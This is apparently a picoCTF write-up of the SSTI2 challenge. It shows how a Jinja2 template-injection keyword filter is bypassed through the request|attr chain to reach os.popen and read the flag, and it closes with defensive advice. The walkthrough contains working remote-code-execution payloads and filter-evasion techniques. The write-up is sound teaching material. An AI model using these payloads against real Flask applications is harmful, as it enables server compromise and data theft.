## Introduction

The **SSTI2** challenge builds on SSTI concepts from SSTI1 but adds an input filter that blocks common keywords like `config`, `__class__`, and `__globals__`. This requires using an alternative access path through `request.application` — a Flask-specific entry point that bypasses most naive keyword-based filters.

> **Challenge Description:** "I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)"

## Solution Walkthrough

### Step 1: Identify the Technology

```bash
curl -i http://picoctf.net:64009/
```

The `Server: Werkzeug` header confirms Flask/Jinja2.

### Step 2: Confirm SSTI

Test basic arithmetic injection:

```
{% raw %}{{7*7}}{% endraw %}
```

Output `49` confirms SSTI is present.

### Step 3: Attempt Standard Payload (Blocked)

The classic SSTI payload is filtered:

```jinja2
{% raw %}{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}{% endraw %}
```

Server response:
```
Stop trying to break me >:(
```

The filter blocks `config`, `.` access to dunder attributes, or specific keywords.

### Step 4: Try Obfuscated Payload (Still Blocked)

Encoding attempt also fails:

```jinja2
{% raw %}{{ getattr(getattr(getattr(config, "_"*2+"class"+"_"*2), "init"), "_"*2+"globals"+"_"*2)["os"].popen("ls").read() }}{% endraw %}
```

### Step 5: Use the `request.application` Chain

The `request` object is always available in Flask templates and is not typically filtered. Use the `|attr()` filter (Jinja2's attribute accessor) to navigate the chain:

**List files:**

```jinja2
{% raw %}{{request
 |attr('application')
 |attr('__globals__')
 |attr('__getitem__')('__builtins__')
 |attr('__getitem__')('__import__')('os')
 |attr('popen')('ls')
 |attr('read')()
}}{% endraw %}
```

This successfully lists files in the current directory.

### Step 6: Read the Flag

```jinja2
{% raw %}{{request
 |attr('application')
 |attr('__globals__')
 |attr('__getitem__')('__builtins__')
 |attr('__getitem__')('__import__')('os')
 |attr('popen')('cat flag')
 |attr('read')()
}}{% endraw %}
```

The flag is returned in the page output.

## Key Concepts

**Two Paths to SSTI RCE in Flask:**

| Path | Entry Point | When to Use |
|---|---|---|
| `config` path | Flask Config object | When `config` keyword is not filtered |
| `request.application` path | Flask request object | When `config` is blocked; always available |

**Why `request.application` Works as a Bypass:**

- `request.application` gives access to the Flask **WSGI application object**
- The application object's functions carry a `__globals__` dictionary containing all module imports
- From `__globals__['__builtins__']`, you can reach `__import__('os')` for shell execution
- Most naive filters block the word `config` but not `request`, making this path reliable

**Jinja2 `|attr()` Filter:**

```jinja2
{% raw %}{{ obj|attr('method_name') }}{% endraw %}
```

Equivalent to `obj.method_name` but expressed as a filter, which can bypass dot-notation input filters.

## Security Insights

- **Keyword blacklists are insufficient:** Any filter based on blocking specific keywords can be bypassed through equivalent expressions, `|attr()`, string concatenation, or alternative access paths.
- **Whitelist approach:** Instead of blocking bad characters, only allow specific safe patterns. Better yet, never allow user input anywhere near a template renderer.
- **Use sandboxed environments:** Jinja2's `SandboxedEnvironment` prevents attribute traversal to `__globals__` and `__builtins__`, making these payloads fail at the engine level.
- **Content Security Policy:** Consider architectural mitigations like running the template renderer in a container with no filesystem access to the flag.

---

## Conclusion

SSTI2 demonstrates that filter-based mitigations for SSTI are fundamentally flawed. Every keyword block can be routed around using alternative entry points. True protection requires architectural changes — sandboxed template environments, strict separation of user data from template code, and never using `render_template_string()` with user input.
